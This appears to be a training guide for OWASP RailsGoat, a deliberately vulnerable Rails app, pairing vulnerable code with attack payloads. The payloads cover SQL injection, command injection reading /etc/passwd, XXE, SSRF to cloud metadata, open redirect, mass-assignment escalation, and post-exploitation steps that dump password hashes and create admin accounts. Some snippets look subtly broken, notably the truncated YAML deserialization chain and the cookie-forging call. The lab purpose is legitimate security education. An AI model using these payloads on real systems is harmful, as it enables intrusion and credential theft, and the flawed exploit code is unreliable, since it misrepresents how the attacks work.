# Rails Goat

## Overview
RailsGoat is a vulnerable Ruby on Rails application maintained by OWASP, designed to educate developers and security professionals about Rails-specific vulnerabilities.

## Quick Start

**Access URL**: http://localhost:3002

**Default Credentials**:
- Admin: `admin@railsgoat.com` / `admin1234`
- User: `user@railsgoat.com` / `user1234`
- Jim: `jim@railsgoat.com` / `jim1234`

## Application Features

- User registration and authentication
- Retirement planning calculator
- Work schedule management
- Performance reviews
- Benefits enrollment
- Messaging system
- Admin dashboard

## Vulnerabilities

### 1. SQL Injection
```ruby
# Vulnerable code
User.where("email = '#{params[:email]}'")

# Attack
http://localhost:3002/users?email=' OR '1'='1
http://localhost:3002/users?email=' UNION SELECT * FROM users--
```

### 2. Command Injection
```ruby
# Vulnerable file upload
def upload
  `file #{params[:file][:tempfile].path}`
end

# Attack - filename with command
"; cat /etc/passwd #.txt"
```

### 3. Mass Assignment
```ruby
# Vulnerable controller
def update
  @user.update_attributes(params[:user])
end

# Attack - escalate privileges
PUT /users/1
user[admin]=true&user[verified]=true
```

### 4. Cross-Site Scripting (XSS)
```erb
<!-- Vulnerable view -->
<%= raw params[:message] %>
<%= params[:search].html_safe %>

<!-- Attack -->
<script>alert(document.cookie)</script>
```

### 5. Insecure Direct Object Reference (IDOR)
```ruby
# No authorization check
def show
  @document = Document.find(params[:id])
end

# Attack
http://localhost:3002/documents/1
http://localhost:3002/documents/2
```

### 6. Session Management Issues
```ruby
# Weak session configuration
Rails.application.config.session_store :cookie_store, 
  key: '_railsgoat_session',
  httponly: false  # XSS can steal sessions
```

### 7. Unvalidated Redirects
```ruby
def login
  redirect_to params[:redirect_url] || root_path
end

# Attack
http://localhost:3002/login?redirect_url=http://evil.com
```

### 8. Security Misconfiguration
```yaml
# config/database.yml exposed
production:
  password: <%= ENV['DATABASE_PASSWORD'] || 'admin123' %>
```

### 9. XML External Entity (XXE)
```ruby
# Unsafe XML parsing
def parse_xml
  doc = Nokogiri::XML(params[:xml])
end

# Attack
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

### 10. Remote Code Execution via YAML
```ruby
# Unsafe YAML parsing
def import_settings
  YAML.load(params[:config])
end

# Attack
---
!ruby/object:Gem::Installer
  i: x
!ruby/object:Gem::SpecFetcher
  i: y
!ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "system('cat /etc/passwd')"
```

### 11. Server-Side Request Forgery (SSRF)
```ruby
def fetch_url
  open(params[:url]).read
end

# Attack
http://localhost:3002/fetch?url=http://169.254.169.254/latest/meta-data/
http://localhost:3002/fetch?url=file:///etc/passwd
```

### 12. Weak Cryptography
```ruby
# MD5 for passwords
Digest::MD5.hexdigest(params[:password])

# Weak encryption key
encrypt_data(data, key: "secret123")
```

## Rails-Specific Vulnerabilities

### 1. Unsafe Query Methods
```ruby
# SQL injection prone methods
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")
User.where("id = #{id}")
User.order("#{params[:sort]} #{params[:direction]}")
```

### 2. CSRF Token Bypass
```ruby
# CSRF protection disabled
skip_before_action :verify_authenticity_token
```

### 3. Information Disclosure
```ruby
# Verbose error pages
config.consider_all_requests_local = true

# Exposed routes
http://localhost:3002/rails/info/routes
```

### 4. Unsafe Metaprogramming
```ruby
# Dynamic method calls
@user.send(params[:method], params[:value])

# Attack
http://localhost:3002/users/1?method=destroy
```

## Exploitation Techniques

### Rails Console Access
```bash
# If you gain shell access
rails console

# Dump all users
User.all.each { |u| puts "#{u.email}: #{u.encrypted_password}" }

# Create admin
User.create!(email: 'hacker@evil.com', password: 'password', admin: true)

# Reset passwords
User.find_by(email: 'admin@railsgoat.com').update!(password: 'hacked')
```

### Database Access
```bash
# Direct database queries
rails dbconsole

# SQL commands
SELECT * FROM users;
UPDATE users SET admin = true WHERE email = 'user@railsgoat.com';
```

### Secret Token Exploitation
```ruby
# Find secret token
Rails.application.secrets.secret_key_base

# Forge session cookies
require 'rack'
Rack::Session::Cookie::Base64::Marshal.new(nil).encode({"user_id" => 1})
```

## Common Misconfigurations

1. **Exposed credentials** in version control
2. **Debug mode** in production
3. **Weak secret_key_base**
4. **No HTTPS enforcement**
5. **Permissive CORS settings**
6. **Exposed admin interfaces**
7. **No rate limiting**

## Testing Tools

### Automated Scanning
```bash
# Brakeman - Rails security scanner
gem install brakeman
brakeman -o report.html

# Bundle audit
gem install bundler-audit
bundle audit check
```

### Manual Testing
```bash
# SQL injection
sqlmap -u "http://localhost:3002/users?email=test" --batch

# XSS testing
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Command injection
; ls -la
| cat /etc/passwd
`whoami`
```

## Defense Mechanisms (What's Missing)
- ❌ Parameterized queries
- ❌ Input validation
- ❌ Output encoding
- ❌ CSRF protection
- ❌ Secure headers
- ❌ Content Security Policy
- ❌ Rate limiting
- ❌ Audit logging

## Learning Path

1. **Authentication & Sessions**
   - Exploit weak session management
   - Bypass authentication
   - Session fixation

2. **Data Protection**
   - SQL injection
   - Mass assignment
   - Information disclosure

3. **Application Logic**
   - IDOR exploitation
   - Business logic flaws
   - Race conditions

4. **Advanced Attacks**
   - RCE via deserialization
   - XXE injection
   - SSRF exploitation

## Additional Resources
- [Rails Security Guide](https://guides.rubyonrails.org/security.html)
- [OWASP Rails Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html)
- [RailsGoat Wiki](https://github.com/OWASP/railsgoat/wiki) 